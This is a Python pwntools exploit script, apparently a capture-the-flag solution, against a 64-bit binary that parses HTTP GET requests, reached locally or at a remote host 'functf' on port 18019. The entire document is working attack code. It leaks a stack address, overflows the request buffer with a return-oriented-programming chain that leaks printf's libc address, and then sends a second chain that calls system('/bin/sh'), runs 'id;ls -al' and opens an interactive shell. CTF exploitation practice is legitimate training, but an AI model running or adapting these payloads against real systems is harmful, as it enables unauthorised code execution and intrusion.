from pwn import *


if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
    pause()
elif sys.argv[1]=="3":
    context.log_level='debug'
    p=remote("functf",18019)
elif sys.argv[1]=="4":
    context.log_level='debug'
    p=remote("localhost",18019)

buf=p.recvuntil(":-)")
print hexdump(buf)
leak_stack = int(buf[-0x12:-4],16)
rop_base = leak_stack + 0x98
print 'leak_stack=',hex(leak_stack)
print 'rop_base=',hex(rop_base)

puts_got=0x601028
printf_got=0x601040
puts_plt=0x400750
poprdi=0x0000000000400b73
main=0x400AE3
ret=0x400B0C

STRGET=0x400BE8

if sys.argv[1]=="3":
    #off=int(sys.argv[2],10)
    off=27 #find good value
else:
    off=0
payload=""
payload="GET "
payload+="A"*(0x68-len(payload))
payload+="a"*off
#payload+=p64(rop_base)[:-2]
payload+=" HTTP/1.1"
payload+="B"*15
payload+="b"*5 #find good value
payload+=p64(ret)*0x60
payload+=p64(poprdi)
payload+=p64(printf_got)
payload+=p64(puts_plt)
payload+=p64(main)
print 'payload len :',hex(len(payload))
p.sendline(payload)
    
buf=p.recvuntil("[debug]")
print hexdump(buf)
libc_printf=u64(buf[-14:-14+6]+"\x00\x00")
print 'libc_printf:',hex(libc_printf)

sleep(1)
buf=p.recvuntil(":-)",timeout=3)
print hexdump(buf)
leak_stack = int(buf[-0x12:-4],16)

#leak_stack = leak_stack = 0x390
rop_base = leak_stack + 0x98
print 'leak_stack=',hex(leak_stack)
print 'rop_base=',hex(rop_base)
libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = libc_printf - libc_elf.sym["printf"]
libc_system = libc_base + libc_elf.sym["system"]
libc_bin_sh = libc_base + libc_elf.search("/bin/sh").next()
print 'libc_base=',hex(libc_base)

payload=""
payload="GET "
payload+="A"*(0x68-len(payload))
payload+="a"*off
#payload+=p64(rop_base)[:-2]
payload+=" HTTP/1.1"
payload+="B"*15
payload+="b"*5 #find good value
payload+=p64(ret)*0x60
payload+=p64(poprdi)
payload+=p64(libc_bin_sh)
payload+=p64(libc_system)
p.sendline(payload)

sleep(1)

p.sendline("id;ls -al")

p.interactive()
